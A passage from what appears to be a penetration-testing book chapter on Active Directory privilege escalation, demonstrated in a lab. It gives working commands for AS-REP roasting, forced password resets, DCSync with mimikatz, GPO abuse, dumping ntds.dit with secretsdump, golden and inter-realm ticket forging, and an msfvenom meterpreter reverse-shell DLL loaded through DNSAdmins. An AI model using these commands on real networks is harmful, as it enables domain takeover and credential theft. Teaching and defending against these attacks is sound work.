<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.15 – Successful targeted Kerberoasting of the lord.varys user</p>
<p>Targeted<a id="_idIndexMarker516"/> AS-REP roasting is based on our control over the <strong class="source-inline">userAccountControl</strong> property, so we can change it to <strong class="bold">not require Kerberos pre-authentication</strong>. I will demonstrate it using PowerView <span class="No-Break">and Rubeus:</span></p>
<pre class="console">
Set-DomainObject -Identity lord.varys -XOR @{useraccountcontrol=4194304} -Verbose
Rubeus.exe asreproast
Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose</pre> <p>The successful attack is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer154">
<img alt="Figure 6.16 – Successful targeted AS-REP roasting of the lord.varys user" height="768" src="image/B18964_06_16.jpg" width="996"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.16 – Successful targeted AS-REP roasting of the lord.varys user</p>
<p>The most <a id="_idIndexMarker517"/>well-known abuse vector is when we have <strong class="bold">AllExtendedRights</strong> or the <strong class="bold">User-Force-Change-Password</strong> right over the user object, meaning that we can reset the user’s password without knowledge of the current one. This a venue was presented in <span class="No-Break">our lab:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer155">
<img alt="Figure 6.17 – tywin.lannister can reset the jaime.lannister user’s password" height="242" src="image/B18964_06_17.jpg" width="788"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.17 – tywin.lannister can reset the jaime.lannister user’s password</p>
<p>The following PowerView commands will do <span class="No-Break">the trick:</span></p>
<pre class="console">
$username = 'sevenkingdoms\tywin.lannister'
$password= ConvertTo-SecureString 'powerkingftw135' -AsPlainText -Force
$auth = New-Object System.Management.Automation.PSCredential $username, $password
$newpassword = ConvertTo-SecureString 'Qwerty123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'sevenkingdoms\jaime.lannister' -AccountPassword $newpassword -Credential $auth -Verbose</pre> <p>The result is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer156">
<img alt="Figure 6.18 – tywin.lannister successfully resets the jaime.lannister user’s password" height="241" src="image/B18964_06_18.jpg" width="917"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.18 – tywin.lannister successfully resets the jaime.lannister user’s password</p>
<p>Lastly, we will have a look at the most powerful ACL that can be used to completely take over the <span class="No-Break">whole domain.</span></p>
<h2 id="_idParaDest-123"><a id="_idTextAnchor133"/>DCSync</h2>
<p><strong class="source-inline">WriteDacl</strong> privileges on the <a id="_idIndexMarker518"/>domain object can be used to grant DCSync privileges (<strong class="source-inline">DS-Replication-Get-Changes and DS-Replication-Get-Changes-All</strong>). To <a id="_idIndexMarker519"/>simulate an attack, I used an ADSI edit and added <strong class="source-inline">jaime.lannister</strong> <strong class="bold">Modify Permissions</strong> and <strong class="bold">Write all properties</strong> rights. We can use PowerView and confirm that the changes <span class="No-Break">were successful:</span></p>
<pre class="console">
Find-InterestingDomainAcl | ?{$_.IdentityReferenceName -eq 'jaime.lannister'}</pre> <p>The result of the command is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer157">
<img alt="Figure 6.19 – The jaime.lannister user has WriteDacl privileges over the domain object" height="269" src="image/B18964_06_19.jpg" width="1012"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.19 – The jaime.lannister<a id="_idTextAnchor134"/> user has WriteDacl privileges over the domain object</p>
<p>We can grant <a id="_idIndexMarker520"/>DCSync privileges to the user and execute the <a id="_idIndexMarker521"/>attack with the <span class="No-Break">following commands:</span></p>
<pre class="console">
Add-DomainObjectAcl -Rights DCSync -TargetIdentity "DC=sevenkingdoms,DC=local" -PrincipalIdentity jaime.lannister -Verbose
mimikatz.exe "lsadump::dcsync /user:krbtgt /csv"</pre> <p>The result of the DCSync attack is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer158">
<img alt="Figure 6.20 – Successful DCSync attack" height="823" src="image/B18964_06_20.jpg" width="886"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.20 – Successful DCSync attack</p>
<p>In the next section, we will discuss ways to abuse the GPO. It is also interconnected with misconfigured ACLs, but this time for the GPO. The attacker can use it for lateral movement, privilege escalation, and persistence in the domain. The detection of this attack was fully covered in <a href="B18964_04.xhtml#_idTextAnchor061"><span class="No-Break"><em class="italic">Chapter 4</em></span></a><span class="No-Break">.</span></p>
<h1 id="_idParaDest-124"><a id="_idTextAnchor135"/>Group Policy abuse</h1>
<p>Server and client Windows <a id="_idIndexMarker522"/>operating systems have various parameters that can be enabled, disabled, or configured. It is possible to apply required parameters locally on each object (local policy), but in the domain, it is much more convenient to prepare and push configuration changes via Group Policy to a set of machines and/or users. These sets of policies are called <a id="_idIndexMarker523"/>the <strong class="bold">Group Policy Object</strong> (<strong class="bold">GPO</strong>). Each GPO has its own GUID. Policy files are stored in the domain SYSVOL folder. By default, GPO creation and linking are allowed only to users with domain administrator’s privileges, however, these permissions can be delegated. The GPO needs to be linked<a id="_idIndexMarker524"/> to <strong class="bold">Organizational Units</strong>, a domain, or a site. The linking process requires an understanding of two more concepts: inheritance and enforcement. If GPLink is enforced, the GPO will apply to the linked OU and all child objects even if inheritance is blocked. If GPLink is not enforced, the GPO will apply to the linked OU and all child objects <a id="_idIndexMarker525"/>until <strong class="bold">block inheritance</strong> is enabled in any following OU. There are ways to apply the GPO even more gradually, such as WMI filtering, security filtering, and link order. But these are rarely used filtering options in practice. We have two main attack venues for the misconfigured GPO, depending on the privileges we obtained: create and link a new GPO or modify an existing GPO. However, we have much more freedom of action when we have successfully obtained control over the GPO itself. The following is a list of abuse scenario examples, which is just the tip of the iceberg, as with a certain level of creativity, only the sky is <span class="No-Break">the limit:</span></p>
<ul>
<li>Add a user to a privileged local group on <span class="No-Break">the machine</span></li>
<li>Add user rights such as SeDebugPrivilege, RDP connection, <span class="No-Break">and similar</span></li>
<li>Configure user and/or computer <span class="No-Break">logon/logoff scripts</span></li>
<li>Adjust registry keys and their DACL, including autorun, <span class="No-Break">for persistence</span></li>
<li>Configure immediate scheduled tasks for the user <span class="No-Break">or computer</span></li>
<li>Malicious <strong class="source-inline">.msi</strong> <span class="No-Break">file installation</span></li>
<li>Create and edit services on <span class="No-Break">the machine</span></li>
<li>Deploy a new <span class="No-Break">evil shortcut</span></li>
<li>Manage firewall and Windows Defender settings (for example, <span class="No-Break">exclude paths)</span></li>
</ul>
<p>At the time of writing, our <a id="_idIndexMarker526"/>lab had no vulnerable GPO introduced, so I created one myself in the <strong class="source-inline">sevenkingdoms</strong> domain and granted extra rights to the <strong class="source-inline">jaime.lannister</strong> user. Let us get down to practicing. We will start with GPO enumeration in the domain and ACL applied to it. The ACLs that we are looking for are our usual suspects: <strong class="source-inline">GenericAll</strong>, <strong class="source-inline">GenericWrite</strong>, <strong class="source-inline">WriteProperty</strong>, <strong class="source-inline">WriteDacl</strong>, <strong class="source-inline">WriteOwner</strong>, and <strong class="source-inline">AllExtendedWrite and WriteMember</strong>. We can use a PowerView one-liner to perform <span class="No-Break">this action:</span></p>
<pre class="console">
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericAll|GenericWrite|WriteProperty|WriteDacl|AllExtendedWrite|WriteMember|WriteOwner")}</pre> <p>In the output, we look for the user with SID outside of usual privileged groups <span class="No-Break">and accounts:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer159">
<img alt="Figure 6.21 – User with GenericAll rights on the GPO" height="221" src="image/B18964_06_21.jpg" width="803"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.21 – User with GenericAll rights on the GPO</p>
<p>Next, we find out the user account with privileges for the GPO, the GPO name, and the OU name with the members to which this GPO is<a id="_idTextAnchor136"/> applied. This can be achieved with the help <span class="No-Break">of PowerView:</span></p>
<pre class="console">
ConvertFrom-SID S-1-5-21-4243769114-3325725031-2403382846-1110
Get-DomainGPO -Identity "CN={776DB09D-32B9-4923-AADE-3056482455CB},CN=Policies,CN=System,DC=sevenkingdoms,DC=local"
Get-DomainOU -GPLink "{776DB09D-32B9-4923-AADE-3056482455CB}" | select distinguishedName
Get-DomainComputer -SearchBase "OU=Vale,DC=sevenkingdoms,DC=local" | select distinguishedName</pre> <p>This information is <a id="_idIndexMarker527"/>shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer160">
<img alt="Figure 6.22 – GPO information" height="905" src="image/B18964_06_22.jpg" width="1037"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.22 – GPO information</p>
<p>We can<a id="_idIndexMarker528"/> escalate privileges by adding <strong class="source-inline">jaime.lannister</strong> to the local administrator group with the help of <strong class="source-inline">SharpGPOAbuse</strong>[12], written <span class="No-Break">by </span><span class="No-Break"><em class="italic">F-Secure</em></span><span class="No-Break">:</span></p>
<pre class="console">
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jaime.lannister --GPOName "hack_me"</pre> <p>The result of the exploitation is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer161">
<img alt="Figure 6.23 – The jaime.lannister user was added to the local administrator’s group" height="904" src="image/B18964_06_23.jpg" width="948"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.23 – The jaime.lannister user was added to the local administrator’s group</p>
<p>Another privilege escalation<a id="_idIndexMarker529"/> scenario is to find users who can create and link policies in the domain. Creating a policy is not enough without linking it to the OU for anything meaningful. The Group Policy container is stored under the <strong class="bold">CN=Policies</strong>, <strong class="bold">CN=System</strong> container within the domain. By default, only “Domain Admins” and “Enterprise Admins” groups have permission to link the GPO to the OU, site, and domain. The name of this permission is <strong class="source-inline">Write gPlink</strong>. To introduce the preceding scenario in our lab, I will grant the <strong class="source-inline">lord.varys CreateChild</strong> user rights on the Group Policy Container and <strong class="source-inline">Write gPlink</strong> for Vale OU. This can be done by adjusting rights in the <strong class="bold">Security</strong> tab of the object’s properties in <strong class="bold">ADSI Edit</strong>, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer162">
<img alt="Figure 6.24 – The lord.varys user has new permissions" height="604" src="image/B18964_06_24.jpg" width="811"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.24 – The lord.varys user has new permissions</p>
<p>Now we can use PowerView to <a id="_idIndexMarker530"/>confirm that the <strong class="source-inline">lord.varys</strong> user indeed has such privileges. The first command will show who can create Group Policies in the domain. The second command will identify every user who has the <strong class="source-inline">WriteProperty</strong> right on the <strong class="source-inline">GP-Link</strong> property for each OU in <span class="No-Break">the domain:</span></p>
<pre class="console">
Get-DomainObjectAcl -ResolveGUIDs -Identity "CN=Policies,CN=System,DC=sevenkingdoms,DC=local"| Where-Object {($_.ActiveDirectoryRights.ToString() -match "CreateChild")} | select securityidentifier
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match "WriteProperty" -and $_.ObjectAceType -eq "GP-Link")} | select SecurityIdentifier, ObjectDN, ObjectACEType | fl</pre> <p>The result of the preceding <a id="_idIndexMarker531"/>command’s execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer163">
<img alt="Figure 6.25 – The lord.varys user has rights to create a GPO and link it to the OU" height="1160" src="image/B18964_06_25.jpg" width="938"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.25 – The lord.varys user has rights to create a GPO and link it to the OU</p>
<p>Now we can create the<a id="_idIndexMarker532"/> GPO and link it to the OU via a <strong class="bold">PowerShell module</strong> or <strong class="bold">Group Policy MMC</strong>. A PowerShell module has limited functions that can be used for malicious purposes <a id="_idIndexMarker533"/>such as <strong class="source-inline">Set-GPPrefRegistryValue</strong> and <strong class="source-inline">Set-GPRegistryValue</strong>, which allow you to create <strong class="bold">Autorun</strong> registry keys with the <span class="No-Break">following syntax:</span></p>
<pre class="console">
Set-GPRegistryValue -Name Legit_Updater -Key "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName Legit -Type String -Value "cmd.exe /c payload.exe"</pre> <p>The next section is devoted to privilege escalation via membership in privileged <span class="No-Break">security groups.</span></p>
<h1 id="_idParaDest-125"><a id="_idTextAnchor137"/>Other privilege escalation vectors</h1>
<p>This section will be <a id="_idIndexMarker534"/>focused on outstanding privilege escalation vectors. We will demonstrate the consequences of adding non-privileged domain users to the various built-in domain security groups. Then, we will describe privilege escalation from the child <a id="_idIndexMarker535"/>to the parent domain using Golden and inter-realm tickets. At the end, the PAM concept will <span class="No-Break">be explained.</span></p>
<p>In general, privileged users, computers, and groups have to be reviewed on a regular basis. From an Active Directory perspective, there is no drastic difference between a user and computer account. If an attacker compromises a machine account that has membership of a privileged group, it will certainly lead to <span class="No-Break">privilege escalation.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Original research was presented by <em class="italic">XPN</em>: <a href="https://secarma.com/using-machine-account-passwords-during-an-engagement/">https://secarma.com/using-machine-account-passwords-during-an-engagement/</a>. The idea is to extract the machine account hash and use it for a pass-the-hash attack, as demonstrated <span class="No-Break">here: </span><a href="https://pentestlab.blog/2022/02/01/machine-accounts/"><span class="No-Break">https://pentestlab.blog/2022/02/01/machine-accounts/</span></a><span class="No-Break">.</span></p>
<p>The primary preventive measure to avoid the elevation of privileges is the principle of least privilege. If you think that a machine account was compromised, it can be disabled. Also, the PowerShell <strong class="source-inline">Reset-ComputerMachinePassword</strong> command can reset a machine <span class="No-Break">account’s password.</span></p>
<h2 id="_idParaDest-126"><a id="_idTextAnchor138"/>Built-in security groups</h2>
<p>There are<a id="_idIndexMarker536"/> several <em class="italic">built-in security groups</em> with preconfigured rights for specific tasks in the domain. We are not going to discuss the usual highly privileged groups, such as <em class="italic">Domain</em>, <em class="italic">Schema</em>, or<em class="italic"> Enterprise Admins</em>. Their purpose in a forest and domain is crystal clear. We will discuss rarely mentioned operator <a id="_idIndexMarker537"/>security groups such<a id="_idIndexMarker538"/> as <strong class="bold">Account Operators</strong>, <strong class="bold">Print Operators</strong>, and <strong class="bold">Server Operators</strong>. In the practical part, we will demonstrate the privilege <a id="_idIndexMarker539"/>escalation venue, where a user with membership of<a id="_idIndexMarker540"/> the <strong class="bold">Backup Operators</strong> group can dump <strong class="source-inline">ntds.dit</strong> from the domain controller. Also, we will achieve remote code execution as <strong class="source-inline">SYSTEM</strong> by <a id="_idIndexMarker541"/>exploiting the DNSAdmins user’s <span class="No-Break">membership (CVE-2021-40469).</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Good documentation about groups is provided by <span class="No-Break">Microsoft: </span><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups"><span class="No-Break">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups</span></a><span class="No-Break">.</span></p>
<p>We will start our <a id="_idIndexMarker542"/>review with the <em class="italic">Account Operators</em> group (<strong class="source-inline">S-1-5-32-548</strong>). As per Microsoft, this group is considered to be a service<a id="_idIndexMarker543"/> administrator group and their recommendation is to leave it empty. In case an attacker compromises a user with membership of such a group, they would be able to log in locally to the domain controller and create or modify accounts (although not <span class="No-Break">administrative accounts).</span></p>
<p>Members of the <em class="italic">Server Operators</em> group (<strong class="source-inline">S-1-5-32-549)</strong> can administer and maintain domain controllers. This <a id="_idIndexMarker544"/>group exists only on them and is empty by default. Members of this group can’t change any administrative group memberships but can edit and start/stop services and back up and restore files. Being a member of this group opens great opportunities for persistence, as it is allowed to change binaries installed on the <span class="No-Break">domain controller.</span></p>
<p>The <em class="italic">Print Operators</em> group (<strong class="source-inline">S-1-5-32-550</strong>) members are allowed to load drivers and manage printers <a id="_idIndexMarker545"/>connected to the domain controller, as well as logging on locally. An attacker can enable <strong class="bold">SeLoadDriverPrivilege</strong> and load a vulnerable driver, such as <strong class="source-inline">Capcom.sys</strong>[13]. However, since Windows 10 version 1803, it is not exploitable anymore, as registry references in <strong class="source-inline">HKEY_Current_User</strong> are <span class="No-Break">not allowed.</span></p>
<p>Now we will move on to <a id="_idIndexMarker546"/>practical exercises. The <em class="italic">Backup Operators</em> group (<strong class="source-inline">S-1-5-32-551</strong>) privileges are quite obviously derived from the group name: back up and restore files despite any permissions set on them. By default, this group is empty. To introduce this vulnerability, I will add the lord.varys user to the group. The exploitation itself is rather straightforward and involves three steps: connection to the remote registry, opening registry hives, and saving them locally or remotely. Registry hives are <strong class="source-inline">SAM</strong>, <strong class="source-inline">SYSTEM</strong>, and <strong class="source-inline">SECURITY</strong>. Then, an attacker can utilize <strong class="source-inline">secretsdump</strong> from <strong class="source-inline">impacket</strong> and use the machine account hash of the domain controller to dump ntds.dit. The exploitation code can be found here[14]. First, let us run the exploit and save registry hives <a id="_idIndexMarker547"/>to the folder where we have access (it can be the UNC path <span class="No-Break">as well):</span></p>
<pre class="console">
BackupOperatorToDA.exe -t \\kingslanding.sevenkingdoms.local -o C:\Users\Public\ -u lord.varys -p "_W1sper_$" -d sevenkingdoms.local</pre> <p>The result of the command execution is the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer164">
<img alt="Figure 6.26 – Successfully dumped registry hives" height="150" src="image/B18964_06_26.jpg" width="976"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.26 – Successfully dumped registry hives</p>
<p>The next step is to extract the domain controller’s machine account hash and <span class="No-Break">dump ntds.dit:</span></p>
<pre class="console">
secretsdump.py LOCAL -system SYSTEM -sam SAM -security SECURITY
secretsdump.py 'sevenkingdoms.local/kingslanding$@kingslanding.sevenkingdoms.local' -hashes aad3b435b51404eeaad3b435b51404ee:7c2c64aebfd101d8927632960df23179 -just-dc</pre> <p>As a result, hashes were <span class="No-Break">successfully dumped:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer165">
<img alt="Figure 6.27 – ntds.dit file was dumped from the domain controller" height="1510" src="image/B18964_06_27.jpg" width="1333"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.27 – ntds.dit file was dumped from the domain controller</p>
<p>The next example will <a id="_idIndexMarker548"/>demonstrate how to achieve remote code execution as <strong class="source-inline">SYSTEM</strong> on the domain controller by just being a member of the <em class="italic">DNSAdmins</em> <span class="No-Break">security group.</span></p>
<h2 id="_idParaDest-127"><a id="_idTextAnchor139"/>DNSAdmins abuse (CVE-2021-40469)</h2>
<p>If an <a id="_idIndexMarker549"/>attacker is a member of the <em class="italic">DNSAdmins</em> group, it is possible to trigger the DNS server to load a DLL of our choice and execute it under the <strong class="source-inline">SYSTEM</strong> context. The <a id="_idIndexMarker550"/>path to the DLL is provided in the <strong class="source-inline">ServerLevelPluginDll</strong> value, which can be a UNC path <span class="No-Break">as well.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A blog post by this finding’s author can be found <span class="No-Break">here: </span><a href="mailto:https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83"><span class="No-Break">https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83</span></a><span class="No-Break">.</span></p>
<p>To demonstrate this technique, I will add the jon.snow user to the DNSAdmins group in the <strong class="source-inline">north.sevenkingdoms.local</strong> domain. Our exploitation path is to generate the DLL with the reverse shell and place it in the <strong class="source-inline">Public</strong> share folder on the <strong class="source-inline">castelblack</strong> server. Then, add the plugin, wait for the DNS server to restart, and obtain the reverse shell on our <span class="No-Break">Kali machine:</span></p>
<pre class="console">
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=443 -f dll &gt; legit.dll
dnscmd.exe winterfell /Config /ServerLevelPluginDll \\castelblack\public\legit.dll</pre> <p>After the DNS server restart, we obtained a reverse shell as <strong class="source-inline">SYSTEM</strong> on the <span class="No-Break">domain controller:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer166">
<img alt="Figure 6.28 – Successful exploitation of CVE-2021-40469 resulting in the reverse shell as SYSTEM on the domain controller" height="624" src="image/B18964_06_28.jpg" width="854"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.28 – Successful exploitation of CVE-2021-40469 resulting in the reverse shell as SYSTEM on the domain controller</p>
<p>Next, we will cover privilege escalation from a child to a parent domain. Also, we will briefly discuss PAM trust and the concept of the <span class="No-Break">bastion domain.</span></p>
<h2 id="_idParaDest-128"><a id="_idTextAnchor140"/>Child/parent domain escalation</h2>
<p>During one of the previous<a id="_idIndexMarker551"/> attacks, we were able to dump <strong class="source-inline">ntds.dit</strong> of the <strong class="source-inline">north.sevenkingdoms.local</strong> domain. Now it is possible to add extra SIDs in <a id="_idIndexMarker552"/>our forge ticket to escalate privileges to the parent domain. To successfully forge tickets, we need the SIDs of both domains – the krbtgt hash for the golden ticket and the trust key for the inter-realm ticket. The following commands will find the domain SIDs and forge the golden ticket with the help <span class="No-Break">of Mimikatz:</span></p>
<pre class="console">
Get-DomainSID -Domain north.sevenkingdoms.local
Get-DomainSID -Domain sevenkingdoms.local
kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-3600105556-770076851-109492085 /sids:S-1-5-21-4243769114-3325725031-2403382846-519 /krbtgt:35400f589a2614495ab9cfcdd0b89eba /ptt</pre> <p><strong class="source-inline">/sid</strong> is the SID <a id="_idIndexMarker553"/>of the child domain. <strong class="source-inline">/sids</strong> is the <strong class="source-inline">Enterprise Admins</strong> SID in the <a id="_idIndexMarker554"/>parent domain. The result is CIFS access to the domain controller in the <span class="No-Break">parent domain:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer167">
<img alt="Figure 6.29 – Forged golden ticket provides access to the domain controller in the parent domain" height="765" src="image/B18964_06_29.jpg" width="797"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.29 – Forged golden ticket provides access to the domain controller in the parent domain</p>
<p>The second option<a id="_idIndexMarker555"/> is to create a referral ticket that is TGT-encrypted<a id="_idIndexMarker556"/> with a trust key. The trust key has the name format <strong class="source-inline">domain$</strong>. The command to forge the inter-realm ticket is <span class="No-Break">the following:</span></p>
<pre class="console">
kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-3600105556-770076851-109492085 /sids:S-1-5-21-4243769114-3325725031-2403382846-519 /rc4:b595f2a41d4579ae6faa122b74b37ccb /service:krbtgt /target:sevenkingdoms.local /ptt</pre> <p>The following <a id="_idIndexMarker557"/>result is the same as the one achieved with the <a id="_idIndexMarker558"/>forged <span class="No-Break">Golden Ticket:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer168">
<img alt="Figure 6.30 – Forged inter-realm ticket provides access to the domain controller in the parent domain" height="901" src="image/B18964_06_30.jpg" width="871"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.30 – Forged inter-realm ticket provides access to the domain controller in the parent domain</p>
<p>There is a way to prevent such a privilege escalation vector – enabling SID filtering between the child and parent domain. If we do not need SID history, for compatibility purposes, it can <span class="No-Break">be disabled.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A great blog post with examples of failed attacks was written by researchers from <span class="No-Break"><em class="italic">Improsec</em></span><span class="No-Break"> (</span><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained"><span class="No-Break">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained</span></a><span class="No-Break">).</span></p>
<p class="callout">However, it was shown in other research made by the same company that not all SIDs are filtered, so their privileges in the child domain should be carefully reviewed (<a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research</a>). Another SID filtering bypass is that <strong class="source-inline">SYSTEM</strong> on the child domain controller can link the GPO to the parent site. It will be replicated even with SID <span class="No-Break">filtering enabled.</span></p>
<h2 id="_idParaDest-129"><a id="_idTextAnchor141"/>Privileged Access Management</h2>
<p><strong class="bold">Privileged Access Management</strong> (<strong class="bold">PAM</strong>) is not a <a id="_idIndexMarker559"/>new concept; it <a id="_idIndexMarker560"/>was introduced by Microsoft<a id="_idIndexMarker561"/> as a part of the <strong class="bold">Enhanced Security Administrative Environment </strong>(<strong class="bold">ESAE</strong>) model, which also<a id="_idIndexMarker562"/> includes <strong class="bold">Just-Enough-Administration</strong> (<strong class="bold">JEA</strong>) and<strong class="bold"> Microsoft Identity Manager</strong> (<strong class="bold">MIM</strong>). The idea<a id="_idIndexMarker563"/> is to create a hardened bastion forest for administrators (Red Forest) and connect it to the production forest by using <a id="_idIndexMarker564"/>one-way <strong class="bold">Privileged Identity Management (PIM</strong>) trust. Just a reminder that the direction of the trust is opposite to the direction of the access. Administrative access to the production forest is managed by <strong class="bold">Shadow Principals</strong> in the <a id="_idIndexMarker565"/>bastion forest. Users from the bastion forest are added to Shadow Principal groups, which are therefore mapped to privileged groups in the production forest. The <strong class="bold">time-to-live</strong> (<strong class="bold">TTL</strong>) value<a id="_idIndexMarker566"/> can be set to reduce the privileged access time. This allows administration of the production forest without interactive logons, group membership, and <span class="No-Break">ACL changes.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A great guide on how to deploy a bastion forest and establish PIM trust can be found <span class="No-Break">here: </span><a href="https://petri.com/windows-server-2016-set-privileged-access-management/"><span class="No-Break">https://petri.com/windows-server-2016-set-privileged-access-management/</span></a><span class="No-Break">.</span></p>
<p>The following commands from <a id="_idIndexMarker567"/>ADModule will check whether the current forest has PAM trust or is managed by a bastion forest and<a id="_idIndexMarker568"/> enumerate <strong class="bold">Shadow </strong><span class="No-Break"><strong class="bold">Security Principals</strong></span><span class="No-Break">:</span></p>
<pre class="console">
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-ADTrust -Filter {(ForestTransitive -eq $True)}
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | l</pre> <ul>
<li>As an attacker, our target is to compromise members of Shadow Security Principal or abuse the <span class="No-Break">SID history.</span></li>
</ul>
<p class="callout-heading">Note</p>
<p class="callout">Great tips about persistence were added by <em class="italic">Nikhil Mittal</em> in this blog <span class="No-Break">post: </span><a href="http://www.labofapenetrationtester.com/2019/04/abusing-PAM.xhtml"><span class="No-Break">http://www.labofapenetrationtester.com/2019/04/abusing-PAM.xhtml</span></a><span class="No-Break">.</span></p>
<p>The obvious way is to add a user to an existing shadow security principal container. However, it can be easily detected during privileged group review. A more stealthy way is to grant a low-privileged user the <strong class="source-inline">WriteMember</strong> right on the Shadow Principal object. Access attempts to the production forest are logged via logon/logoff events but depending on the user account, an alert can <span class="No-Break">be raised.</span></p>
<h1 id="_idParaDest-130"><a id="_idTextAnchor142"/>Summary</h1>
<p>In this chapter, we covered how an attacker can escalate privileges inside the domain. We started our conversation with deadly exploits that grant the highest privileges in the blink of an eye. Regular patching and vulnerability management can help to mitigate this attack vector. Next, we looked at various ACL abuses against domain objects. We reviewed the most common privilege escalation paths, accompanied by practical examples. Special attention was paid to GPO abuse, as Group Policies can be deployed throughout the domain, providing an attacker with lateral movement, privilege escalation, and persistence opportunities all at once. We also discussed built-in domain groups that can be used for privilege escalation if a member of a such group has been compromised. Lastly, we looked at privilege escalation through trust relationships between child and parent domains. Also, briefly, we touched upon the PAM trust theme and possible misconfigurations that could ruin the whole <span class="No-Break">ESAE model.</span></p>
<p>In the next chapter, we will talk about ways an attacker can achieve persistence in the domain. It is critical to understand how an attacker can maintain access to <span class="No-Break">the domain.</span></p>
<h1 id="_idParaDest-131"><a id="_idTextAnchor143"/>References</h1>
<ol>
<li>MS14-068 <span class="No-Break">exploit: </span><a href="https://github.com/mubix/pykek"><span class="No-Break">https://github.com/mubi<span id="_idTextAnchor144"/>x/pykek</span></a></li>
<li>Zerologon relay <span class="No-Break">scenario: </span><a href="https://dirkjanm.io/a-different-way-of-abusing-zerologon/"><span class="No-Break">https://dirkjanm.io/a-different-way-of-abusing-zerologon/</span></a></li>
<li>Zerologon change password <span class="No-Break">scenario: </span><a href="https://www.thehacker.recipes/ad/movement/netlogon/zerologon"><span class="No-Break">https://www.thehacker.recipes/ad/movement/netlogon/zerologon</span></a></li>
<li>Zerologon exploits: <a href="https://github.com/VoidSec/CVE-2020-1472">https://github.com/VoidSec/CVE-2020-1472</a> <span class="No-Break">and </span><a href="https://github.com/dirkjanm/CVE-2020-1472"><span class="No-Break">https://github.com/dirkjanm/CVE-2020-1472</span></a></li>
<li>Printnightmare exploitation <span class="No-Break">constraints: </span><a href="https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare#constraints"><span class="No-Break">https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare#constraints</span></a></li>
<li>Printnightmare <span class="No-Break">exploit: </span><a href="https://github.com/cube0x0/CVE-2021-1675"><span class="No-Break">https://github.com/cube0x0/CVE-2021-1675</span></a></li>
<li>Windows version noPac <span class="No-Break">exploit: </span><a href="https://github.com/cube0x0/noPac"><span class="No-Break">https://github.com/cube0x0/noPac</span></a></li>
